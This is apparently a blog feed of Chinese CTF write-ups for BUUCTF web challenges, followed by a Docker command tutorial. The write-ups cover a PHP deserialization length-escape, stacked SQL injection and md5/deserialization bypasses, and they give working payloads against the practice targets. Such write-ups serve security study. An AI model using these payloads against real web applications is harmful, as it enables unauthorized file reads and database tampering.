    <content type="text"><![CDATA[考点：php反序列化字符长度逃逸打开题目 一般看到登录框，就以为是sql注入题，这道题不是。 dirsearch扫网站目录1234567891011121314151617python3 dirsearch.py -u &quot;http://16b5eb0b-ac30-452a-808a-0e9214102abd.node3.buuoj.cn/&quot; -s 1 --exclude-status=429,403 -t 1 _|. _ _ _ _ _ _|_ v0.4.1 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 1 | Wordlist size: 10848Error Log: F:\Tools\WEB\Python-Tools\dirsearch-master\logs\errors-21-04-12_16-36-23.logTarget: http://16b5eb0b-ac30-452a-808a-0e9214102abd.node3.buuoj.cn/Output File: F:\Tools\WEB\Python-Tools\dirsearch-master\reports\16b5eb0b-ac30-452a-808a-0e9214102abd.node3.buuoj.cn\_21-04-12_16-36-24.txt[16:36:24] Starting:[16:36:28] 200 - 392KB - /www.zip[16:36:33] 200 - 788B - /php[16:36:38] 200 - 788B - /js 看了别人wp，这道题存在源码泄露，在网站目录会泄漏一个www.zip文件，用工具扫，还不容易扫出来，我开了代理居然扫不出来。 下载下来，有这么些文件。 分析关键的三个地方 update.php 12345678910111213141516171819202122232425if($_POST['phone'] &amp;&amp; $_POST['email'] &amp;&amp; $_POST['nickname'] &amp;&amp; $_FILES['photo']) &#123; $username = $_SESSION['username']; if(!preg_match('/^\d&#123;11&#125;$/', $_POST['phone'])) die('Invalid phone'); if(!preg_match('/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/', $_POST['email'])) die('Invalid email'); if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname'); $file = $_FILES['photo']; if($file['size'] &lt; 5 or $file['size'] &gt; 1000000) die('Photo size error'); move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name'])); $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); # 这里会调用 class.php 的 update_profile 方法 $user-&gt;update_profile($username, serialize($profile)); echo 'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;';&#125; profile.php 123456789101112131415161718&lt;?php require_once('class.php'); if($_SESSION['username'] == null) &#123; die('Login First'); &#125; $username = $_SESSION['username']; # 这里调用的是class.php 的 show_profile方法 $profile=$user-&gt;show_profile($username); if($profile == null) &#123; header('Location: update.php'); &#125; else &#123; $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo']));?&gt; class.php 123456789101112131415161718192021222324252627282930313233public function show_profile($username) &#123; $username = parent::filter($username); $where = "username = '$username'"; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125; # public function update_profile($username, $new_profile) &#123; $username = parent::filter($username); # 这就是造成序列化漏洞的关键地方 $new_profile = parent::filter($new_profile); $where = "username = '$username'"; return parent::update($this-&gt;table, 'profile', $new_profile, $where); &#125;public function select($table, $where, $ret = '*') &#123; $sql = "SELECT $ret FROM $table WHERE $where"; $result = mysql_query($sql, $this-&gt;link); return mysql_fetch_object($result); &#125;# 这个方法将 序列化后的内容 进行了替换 将含有'select', 'insert', 'update', 'delete', 'where' 以上关键字 替换成了 hacker 并且还进行了返回public function filter($string) &#123; $escape = array('\'', '\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string); &#125; 简化来看12345678910111213141516171819202122232425262728&lt;?php$profile['phone'] = $_POST['phone'];$profile['email'] = $_POST['email'];$profile['nickname'] = $_POST['nickname'];$profile['photo'] = 'upload/';$str1 = filter(serialize($profile));var_dump($str1);echo "&lt;br/&gt;";$str2 = unserialize($str1);echo "nickname:".$str2['nickname'];echo "&lt;br/&gt;";echo "photo:".$str2['photo'];function filter($string) &#123; $escape = array('\'', '\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string);&#125;?&gt; 按照下列参数进行提交，返回的序列化结果 1phone=11111111111&amp;email=123@qq.com&amp;nickname=fany 1a:4:&#123;s:5:"phone";s:11:"11111111111";s:5:"email";s:10:"123@qq.com";s:8:"nickname";s:4:"fany";s:5:"photo";s:7:"upload/";&#125; 提交过滤参数，看返回的序列化结果 1phone=11111111111&amp;email=123@qq.com&amp;nickname=wherewherewhere 1a:4:&#123;s:5:"phone";s:11:"11111111111";s:5:"email";s:10:"123@qq.com";s:8:"nickname";s:15:"hackerhackerhacker";s:5:"photo";s:7:"upload/";&#125; 可以看到出现了报错，原本输入的where序列化后的长度为15，输出显示的时候，经过了filter对其内容进行了过滤，where被替换为hacker，但是序列化后的长度没有变，替换成hacker，由于where比hacker少了一位，所以在读取时，发现读取到15位的时候并没有读取到 ; 所以就照成了报错。 接下来利用这个漏洞 1phone=11111111111&amp;email=123@qq.com&amp;nickname=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";s:5:"photo";s:10:"config.php";&#125; 1a:4:&#123;s:5:"phone";s:11:"11111111111";s:5:"email";s:10:"123@qq.com";s:8:"nickname";s:198:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:5:"photo";s:10:"config.php";&#125;";s:5:"photo";s:7:"upload/";&#125; 直接可以看到photo 变成了config.php。分析一下，&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;} 的字符串长度为33，输入了33个where，总长度为33+33*5=198，在总长度不变的情况下，33个where替换成了33个hacker， 33*6=198，自然读取到的就是 结束的位置，后面接上的&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;} 就接着读取。因为总属性为4个，也已经读取完毕，后边的;s:5:&quot;photo&quot;;s:7:&quot;upload/&quot;;} 就会被丢去掉。 回到题目12345678910111213141516171819202122232425if($_POST['phone'] &amp;&amp; $_POST['email'] &amp;&amp; $_POST['nickname'] &amp;&amp; $_FILES['photo']) &#123; $username = $_SESSION['username']; if(!preg_match('/^\d&#123;11&#125;$/', $_POST['phone'])) die('Invalid phone'); if(!preg_match('/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/', $_POST['email'])) die('Invalid email'); if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname'); $file = $_FILES['photo']; if($file['size'] &lt; 5 or $file['size'] &gt; 1000000) die('Photo size error'); move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name'])); $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); $user-&gt;update_profile($username, serialize($profile)); echo 'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'; &#125; update.php 里的 会接收三个参数，$profile[‘phpone’]、$profile[‘email’]、$profile[‘nickname’]。 在传入$profile[‘ncikname’]会存在一个条件 1if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) 不是大写字母小写字母数字下划线 或者 字符串长度大于10 就直接报错，停止程序，这里直接就来一手数组绕过。 进行profile.php页面,提交，抓包。 1wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 得到 1PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdmbGFne2U1ZWY1MDE0LWMzZmQtNDIyYS1hNWE4LWYyMDkzMWM0YWNmYX0nOwo/Pgo= base64解码 坑点提交的时候 需要将nickname转换为数组进行提交，我提交多次都都还是读取不到，报Warning: file_get_contents(): Filename cannot be empty in /var/www/html/profile.php on line 16，看了他们的payload后，发现在ncikname处有 } 闭合，我就很纳闷，我平时序列化都是末尾才会有这个括号，后来经过验证，只要是数组，都会单独有个闭合。 payload 1wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【强网杯 2019】随便注 1]]></title>
    <url>%2F2021%2F03%2F26%2F%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8%201%2F</url>
    <content type="text"><![CDATA[考点：堆叠注入打开supersqli ctftraining test words 1919810931114514 更改表名 语句rename table 表名 to 新表名; 更改表名结构添加id 字段 并 设置约束alert table wordsadd id int unsigned not Null auto_increment primary key ; 将table表中得 字段flag 重命名为 dataalert table words change flag data 第一种方式原理：flag值在1919810931114514这张表中，由于select 关键字被过滤，能用show看到数据库名和表名，而页面回显的内容是words表中的内容，而在这里，我们可以进行堆叠注入，可以修改表结构，先将words表改为其他的名，然后再将1919810931114514改成words，当然还没完，页面回显的是id字段的内容，而此时的words表中的字段名为flag，这时我们就需要通过修改表结构，将flag字段改为id字段，因为flag字段的类型为varchar(100),在改成id字段名的时候也需要重新指定。1’ ; rename tables words to word1 ; rename tables 1919810931114514 to words ; alter table words change flag id varchar(100);# 第二种PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字供之后调用EXECUTE ：执行命令set @a=concat(“sel”,”ect flag from 1919810931114514“);1’;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# 第三种1’; handler 1919810931114514 open as a; handler a read next;# 总结 第一种方式还比较容易理解，到了第二第三，真不是那么好理解，使用的关键字都比较冷门，平时基本都不会用。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>堆叠注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB BUU BRUTE 1 WP]]></title>
    <url>%2F2021%2F03%2F25%2FBUU%20BRUTE%201%20WP%2F</url>
    <content type="text"><![CDATA[考点：密码爆破打开连接 分析一道登录题，以为是sql注入，其实不是，只是一道简单的4位数字密码爆破题，账号经过测试，存在admin，打开bp，抓包爆破。 拿到flag]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>密码爆破</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB BUU CODE REVIEW 1 WP]]></title>
    <url>%2F2021%2F03%2F25%2FBUU%20CODE%20REVIEW%201%20WP%2F</url>
    <content type="text"><![CDATA[考点：绕过md5加密和反序列化打开1234567891011121314151617181920212223242526272829303132&lt;?php/** * Created by PhpStorm. * User: jinzhao * Date: 2019/10/6 * Time: 8:04 PM */highlight_file(__FILE__);class BUU &#123; public $correct = ""; public $input = ""; public function __destruct() &#123; try &#123; $this-&gt;correct = base64_encode(uniqid()); if($this-&gt;correct === $this-&gt;input) &#123; echo file_get_contents("/flag"); &#125; &#125; catch (Exception $e) &#123; &#125; &#125;&#125;if($_GET['pleaseget'] === '1') &#123; if($_POST['pleasepost'] === '2') &#123; if(md5($_POST['md51']) == md5($_POST['md52']) &amp;&amp; $_POST['md51'] != $_POST['md52']) &#123; unserialize($_POST['obj']); &#125; &#125;&#125; 分析一道反序列化题，分析代码后，要拿到flag，必须要达到下面几个条件。 $_GET[&#39;pleaseget&#39;]===1 $_POST[&#39;pleasepost&#39;]===2 md5($_POST[&#39;md51&#39;])==md5($_POST[&#39;md52&#39;])&amp;&amp;$_POST[&#39;md51&#39;]!=$_POST[&#39;md52&#39;] $this-&gt;correct === $this-&gt;input 第一个和第二个条件很简单不用说，只需要提交对应的参数和参数值即可。 第三个条件，可以用数组绕过MD5加密，数组进行MD5加密会返回false。 构造md51[]=1&amp;md52[]=2 即可绕过 这才来到最关键的地方，如何在序列化前让$this-&gt;correct === $this-&gt;input 呢？，我们创建BUU类后，重新给$this-&gt;correct 赋值成 $this-&gt;input的值。 123$b1 = new BUU();$b1-&gt;correct=&amp;$b1-&gt;input;print_r(serialize($b1)); 1O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125; # 得到序列化后的内容 提交get 1?pleaseget=1 post 1pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125; 拿到flag1flag&#123;0f14da5c-5e42-49c2-b2e3-5ee2f9f1e285&#125;]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker常用命令]]></title>
    <url>%2F2021%2F03%2F12%2FDocker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[docker官网文档地址：https://docs.docker.com/get-docker/ 安装docker流程 1、卸载旧的版本 2、需要的安装报 3、设置镜像的仓库 4、安装docker需要的依赖 5、启动 阿里云容器镜像加速地址：https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors Docker基本概念镜像 容器 仓库 容器与镜像的关系类似于面向对象编程中的对象与类。 Docker常用命令 帮助命令docker version 显示docker的常用信息 1234567891011yangfan@yangfan-virtual-machine:~$ docker versionClient: Docker Engine - Community Version: 20.10.5 API version: 1.41 Go version: go1.13.15 Git commit: 55c4c88 Built: Tue Mar 2 20:18:05 2021 OS/Arch: linux/amd64 Context: default Experimental: trueGot permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.24/version: dial unix /var/run/docker.sock: connect: permission denied docker info 显示docker的信息信息，包括镜像和容器的数量 1234567891011yangfan@yangfan-virtual-machine:~$ docker infoClient: Context: default Debug Mode: false Plugins: app: Docker App (Docker Inc., v0.9.1-beta3) buildx: Build with BuildKit (Docker Inc., v0.5.1-docker)Server:ERROR: Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.24/info: dial unix /var/run/docker.sock: connect: permission deniederrors pretty printing info docker –help 显示帮助信息 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485yangfan@yangfan-virtual-machine:~$ docker --helpUsage: docker [OPTIONS] COMMANDA self-sufficient runtime for containersOptions: --config string Location of client config files (default "/home/yangfan/.docker") -c, --context string Name of the context to use to connect to the daemon (overrides DOCKER_HOST env var and default context set with "docker context use") -D, --debug Enable debug mode -H, --host list Daemon socket(s) to connect to -l, --log-level string Set the logging level ("debug"|"info"|"warn"|"error"|"fatal") (default "info") --tls Use TLS; implied by --tlsverify --tlscacert string Trust certs signed only by this CA (default "/home/yangfan/.docker/ca.pem") --tlscert string Path to TLS certificate file (default "/home/yangfan/.docker/cert.pem") --tlskey string Path to TLS key file (default "/home/yangfan/.docker/key.pem") --tlsverify Use TLS and verify the remote -v, --version Print version information and quitManagement Commands: app* Docker App (Docker Inc., v0.9.1-beta3) builder Manage builds buildx* Build with BuildKit (Docker Inc., v0.5.1-docker) config Manage Docker configs container Manage containers context Manage contexts image Manage images manifest Manage Docker image manifests and manifest lists network Manage networks node Manage Swarm nodes plugin Manage plugins secret Manage Docker secrets service Manage services stack Manage Docker stacks swarm Manage Swarm system Manage Docker trust Manage trust on Docker images volume Manage volumesCommands: attach Attach local standard input, output, and error streams to a running container build Build an image from a Dockerfile commit Create a new image from a container's changes cp Copy files/folders between a container and the local filesystem create Create a new container diff Inspect changes to files or directories on a container's filesystem events Get real time events from the server exec Run a command in a running container export Export a container's filesystem as a tar archive history Show the history of an image images List images import Import the contents from a tarball to create a filesystem image info Display system-wide information inspect Return low-level information on Docker objects kill Kill one or more running containers load Load an image from a tar archive or STDIN login Log in to a Docker registry logout Log out from a Docker registry logs Fetch the logs of a container pause Pause all processes within one or more containers port List port mappings or a specific mapping for the container ps List containers pull Pull an image or a repository from a registry push Push an image or a repository to a registry rename Rename a container restart Restart one or more containers rm Remove one or more containers rmi Remove one or more images run Run a command in a new container save Save one or more images to a tar archive (streamed to STDOUT by default) search Search the Docker Hub for images start Start one or more stopped containers stats Display a live stream of container(s) resource usage statistics stop Stop one or more running containers tag Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE top Display the running processes of a container unpause Unpause all processes within one or more containers update Update configuration of one or more containers version Show the Docker version information wait Block until one or more containers stop, then print their exit codesRun 'docker COMMAND --help' for more information on a command.To get more help with docker, check out our guides at https://docs.docker.com/go/guides/ 镜像命令docker images 查看所有本地的主机上的镜像 123456yangfan@yangfan-virtual-machine:~$ sudo docker images[sudo] yangfan 的密码： REPOSITORY TAG IMAGE ID CREATED SIZEmysql 5.7 a70d36bc331a 6 weeks ago 449MBcentos latest 300e315adb2f 2 months ago 209MBhello-world latest bf756fb1ae65 14 months ago 13.3kB docker search 镜像名 查找镜像 123456789101112131415161718192021222324252627yangfan@yangfan-virtual-machine:~$ sudo docker search mysqlNAME DESCRIPTION STARS OFFICIAL AUTOMATEDmysql MySQL is a widely used, open-source relation… 10570 [OK] mariadb MariaDB Server is a high performing open sou… 3949 [OK] mysql/mysql-server Optimized MySQL Server Docker images. Create… 774 [OK]percona Percona Server is a fork of the MySQL relati… 527 [OK] centos/mysql-57-centos7 MySQL 5.7 SQL database server 87 mysql/mysql-cluster Experimental MySQL Cluster Docker images. Cr… 79 centurylink/mysql Image containing mysql. Optimized to be link… 59 [OK]bitnami/mysql Bitnami MySQL Docker Image 48 [OK]deitch/mysql-backup REPLACED! Please use http://hub.docker.com/r… 41 [OK]databack/mysql-backup Back up mysql databases to... anywhere! 39 prom/mysqld-exporter 37 [OK]tutum/mysql Base docker image to run a MySQL database se… 35 schickling/mysql-backup-s3 Backup MySQL to S3 (supports periodic backup… 29 [OK]linuxserver/mysql A Mysql container, brought to you by LinuxSe… 27 centos/mysql-56-centos7 MySQL 5.6 SQL database server 20 circleci/mysql MySQL is a widely used, open-source relation… 20 mysql/mysql-router MySQL Router provides transparent routing be… 18 arey/mysql-client Run a MySQL client from a docker container 17 [OK]fradelg/mysql-cron-backup MySQL/MariaDB database backup using cron tas… 12 [OK]yloeffler/mysql-backup This image runs mysqldump to backup data usi… 7 [OK]openshift/mysql-55-centos7 DEPRECATED: A Centos7 based MySQL v5.5 image… 6 devilbox/mysql Retagged MySQL, MariaDB and PerconaDB offici… 3 ansibleplaybookbundle/mysql-apb An APB which deploys RHSCL MySQL 2 [OK]jelastic/mysql An image of the MySQL database server mainta… 1 widdpim/mysql-client Dockerized MySQL Client (5.7) including Curl… 1 [OK] docker pull 镜像名 下载镜像 默认使用最新版 1234567891011121314151617181920212223242526yangfan@yangfan-virtual-machine:~$ sudo docker pull citizenstig/dvwaUsing default tag: latestlatest: Pulling from citizenstig/dvwa8387d9ff0016: Pull complete 3b52deaaf0ed: Pull complete 4bd501fad6de: Pull complete a3ed95caeb02: Pull complete 790f0e8363b9: Pull complete 11f87572ad81: Pull complete 341e06373981: Pull complete 709079cecfb8: Pull complete 55bf9bbb788a: Pull complete b41f3cfd3d47: Pull complete 70789ae370c5: Pull complete 43f2fd9a6779: Pull complete 6a0b3a1558bd: Pull complete 934438c9af31: Pull complete 1cfba20318ab: Pull complete de7f3e54c21c: Pull complete 596da16c3b16: Pull complete e94007c4319f: Pull complete 3c013e645156: Pull complete 7b3eb1ac6cfe: Pull complete Digest: sha256:1c0ab894f0bf41351519c8388a282c0a178216e9ce8f0399a162472070379dc6Status: Downloaded newer image for citizenstig/dvwa:latestdocker.io/citizenstig/dvwa:latest 指定版本 docker pull 镜像名[:tag] 12345678910111213141516yangfan@yangfan-virtual-machine:~$ sudo docker pull mysql:5.75.7: Pulling from library/mysqla076a628af6f: Pull complete f6c208f3f991: Pull complete 88a9455a9165: Pull complete 406c9b8427c6: Pull complete 7c88599c0b25: Pull complete 25b5c6debdaf: Pull complete 43a5816f1617: Pull complete 1831ac1245f4: Pull complete 37677b8c1f79: Pull complete 27e4ac3b0f6e: Pull complete 7227baa8c445: Pull complete Digest: sha256:b3d1eff023f698cd433695c9506171f0d08a8f92a0c8063c1a4d9db9a55808dfStatus: Downloaded newer image for mysql:5.7docker.io/library/mysql:5.7 docker rmi 删除镜像包 docker rmi id 通过id删除镜像 123456789101112131415yangfan@yangfan-virtual-machine:~$ sudo docker rmi a70d36bc331aUntagged: mysql:5.7Untagged: mysql@sha256:b3d1eff023f698cd433695c9506171f0d08a8f92a0c8063c1a4d9db9a55808dfDeleted: sha256:a70d36bc331a13d297f882d3d63137d24b804f29fa67158c40ad91d5050c39c5Deleted: sha256:50c77bf7bcddd1f1d97789d80ac2404eec22c860c104e858620d2a2e321f0ef7Deleted: sha256:14244329b83dfc8982398ee4104a548385652d2bffb957798ff86a419013efd6Deleted: sha256:6d990477f90af28473eb601a9bca22253f6381e053c5a8edda0a4f027e124a3cDeleted: sha256:ee0449796df204071589162fc16f8d65586312a40c68d1ba156c93c56f5e5ce8Deleted: sha256:d08533f1e2acc40ad561a46fc6a76b54c739e6b24f077c183c5709e0a6885312Deleted: sha256:4f9d91a4728e833d1062fb65a792f06e22e425f63824f260c8b5a64b776ddc38Deleted: sha256:20bf4c759d1b0d0e6286d2145453af4e0e1b7ba3d4efa3b8bce46817ad4109deDeleted: sha256:a9371bbdf16ac95cc72555c6ad42f79b9f03a82d964fe89d52bdc5f335a5f42aDeleted: sha256:5b02130e449d94f51e8ff6e5f7d24802246198749ed9eb064631e63833cd8f1dDeleted: sha256:ab74465b38bc1acb16c23091df32c5b7033ed55783386cb57acae8efff9f4b37Deleted: sha256:cb42413394c4059335228c137fe884ff3ab8946a014014309676c25e3ac86864 docker rmi -f $(docker images -qa) 删除全部镜像 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990yangfan@yangfan-virtual-machine:~$ sudo docker rmi -f $(sudo docker images -a)Untagged: mysql:5.7Untagged: mysql@sha256:b3d1eff023f698cd433695c9506171f0d08a8f92a0c8063c1a4d9db9a55808dfDeleted: sha256:a70d36bc331a13d297f882d3d63137d24b804f29fa67158c40ad91d5050c39c5Deleted: sha256:50c77bf7bcddd1f1d97789d80ac2404eec22c860c104e858620d2a2e321f0ef7Deleted: sha256:14244329b83dfc8982398ee4104a548385652d2bffb957798ff86a419013efd6Deleted: sha256:6d990477f90af28473eb601a9bca22253f6381e053c5a8edda0a4f027e124a3cDeleted: sha256:ee0449796df204071589162fc16f8d65586312a40c68d1ba156c93c56f5e5ce8Deleted: sha256:d08533f1e2acc40ad561a46fc6a76b54c739e6b24f077c183c5709e0a6885312Deleted: sha256:4f9d91a4728e833d1062fb65a792f06e22e425f63824f260c8b5a64b776ddc38Deleted: sha256:20bf4c759d1b0d0e6286d2145453af4e0e1b7ba3d4efa3b8bce46817ad4109deDeleted: sha256:a9371bbdf16ac95cc72555c6ad42f79b9f03a82d964fe89d52bdc5f335a5f42aDeleted: sha256:5b02130e449d94f51e8ff6e5f7d24802246198749ed9eb064631e63833cd8f1dDeleted: sha256:ab74465b38bc1acb16c23091df32c5b7033ed55783386cb57acae8efff9f4b37Untagged: tomcat:latestUntagged: tomcat:9.0Untagged: tomcat@sha256:94cc18203335e400dbafcd0633f33c53663b1c1012a13bcad58cced9cd9d1305Deleted: sha256:040bdb29ab375db2a8de090070dcbee19d43f609385a934c3f2b423e515f57bbDeleted: sha256:03ac467e286d36301dba7daaec530f481074197d22d41bd48a32e5a2e3069573Deleted: sha256:c56c3d4e36aac2060fdb29c95baf4b4d6916fe9a454751b77b8d89f27dd8dda4Deleted: sha256:0f3911a87064866cd2aa7fd863afc1e02bdfa4856afa351e871f0e6a48cfd52bDeleted: sha256:7891c5716382337382836e0af1ea998bf77c1eed9c8e806c7aac5f489952f4baDeleted: sha256:56dee2fc4110951264d4b134b303920c633aabbbb0264dc218518b3547320de2Deleted: sha256:cd253bbc5a1ce457359958f4905b53a3f6f0ac167ba5065f68385600fdbae99eDeleted: sha256:03b0292dbc6978fe1077f948ac07472a8cac23fb4c3cf92c76f5eb62891e3d5aDeleted: sha256:19f2a825ed46bbf16a06d9d5185a0ac68196217f302e760abb4cbc3178b14cc1Deleted: sha256:b4f0436e967b6b9b021d3ed900a5422da6d8fe8c17c51c7d7e4f9c105812f868Deleted: sha256:4762552ad7d851a9901571428078281985074e5ddb806979dd7ad24748db4ca0Untagged: nginx:latestUntagged: nginx@sha256:10b8cc432d56da8b61b070f4c7d2543a9ed17c2b23010b43af434fd40e2ca4aaDeleted: sha256:f6d0b4767a6c466c178bf718f99bea0d3742b26679081e52dbf8e0c7c4c42d74Deleted: sha256:4dfe71c4470c5920135f00af483556b09911b72547113512d36dc29bfc5f7445Deleted: sha256:3c90a0917c79b758d74b7040f62d17a7680cd14077f734330b1994a2985283b8Deleted: sha256:a1c538085c6f891424160d8db120ea093d4dda393e94cd4713e3fff3c82299b5Deleted: sha256:a3ee2510dcf02c980d7aff635909612006fd1662084d6225e52e769b984abeb5Deleted: sha256:cb42413394c4059335228c137fe884ff3ab8946a014014309676c25e3ac86864Untagged: nginx:1.18.0-alpineUntagged: nginx@sha256:7ae8e5c3080f6012f8dc719e2308e60e015fcfa281c3b12bf95614bd8b6911d6Deleted: sha256:f2343e2e25078726ff14f81e5f530e390ac147eef63a4828db6cc2c4155ff88fDeleted: sha256:c584818973ae5022b23a6b851d2c9119b32458154a9cab36181b80edcea176cfDeleted: sha256:b6efb22fdcfd525d19e21844e59a80ca9e4b194b581961bc080977d5f69ab59aDeleted: sha256:f1d9a117248f08168772190c89436e26770693b6d5a2c61425ca905befabe858Deleted: sha256:2c1427c3e3c7078294a8cf7a4c7cdc556c83b3492ffb11149ecf0d1f7d96278bDeleted: sha256:0fcbbeeeb0d7fc5c06362d7a6717b999e605574c7210eff4f7418f6e9be9fbfeUntagged: centos:latestUntagged: centos@sha256:5528e8b1b1719d34604c87e11dcd1c0a20bedf46e83b5632cdeac91b8c04efc1Deleted: sha256:300e315adb2f96afe5f0b2780b87f28ae95231fe3bdd1e16b9ba606307728f55Deleted: sha256:2653d992f4ef2bfd27f94db643815aa567240c37732cae1405ad1c1309ee9859Error response from daemon: invalid reference format: repository name must be lowercaseError response from daemon: invalid reference format: repository name must be lowercaseError response from daemon: invalid reference format: repository name must be lowercaseError response from daemon: invalid reference format: repository name must be lowercaseError response from daemon: invalid reference format: repository name must be lowercaseError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: mysqlError: No such image: 5.7Error: No such image: 6Error: No such image: weeksError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: 9.0Error: No such image: 7Error: No such image: weeksError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: tomcatError: No such image: latestError: No such image: 040bdb29ab37Error: No such image: 7Error: No such image: weeksError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: latestError: No such image: f6d0b4767a6cError: No such image: 7Error: No such image: weeksError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: nginxError: No such image: 1.18.0-alpineError: No such image: 2Error: No such image: monthsError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: latestError: No such image: 300e315adb2fError: No such image: 2Error: No such image: monthsError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercase 容器命令docker run [可选参数] [image/镜像名] 新建容器并启动 # 参数 –name=”Name” 容器名字 -d 后台方式运行 -it 使用交互方式运行，进入容器查看内容 -p 指定容器端口 -p 8080:8080 -p ip:主机端口：容器端口 -p 主机端口：容器端口（常用） -p 容器端口 容器端口 -P 随机指定端口 12345yangfan@yangfan-virtual-machine:~$ sudo docker run --name nginx2 -d -p 3355:80 nginxd5b419eeaa4675888040fe56963c692ac08ab18449abcc0554456a5eff5cb4eeyangfan@yangfan-virtual-machine:~$ sudo docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESd5b419eeaa46 nginx "/docker-entrypoint.…" 9 seconds ago Up 8 seconds 0.0.0.0:3355-&gt;80/tcp nginx2 ​ # 测试 启动并进入容器 docker run -it centos /bin/bash 退出 exit docker ps 列出当前正在运行的容器 123yangfan@yangfan-virtual-machine:~$ sudo docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES7c869b1bbcbc centos "/bin/bash" 2 hours ago Up 2 hours fervent_chatelet 参数 -a 列出所有的运行的容器+出历史运行过的容器 退出容器 exit 直接容器停止并退出 ctrl + P + Q 容器不停止退出 删除容器 docker rm 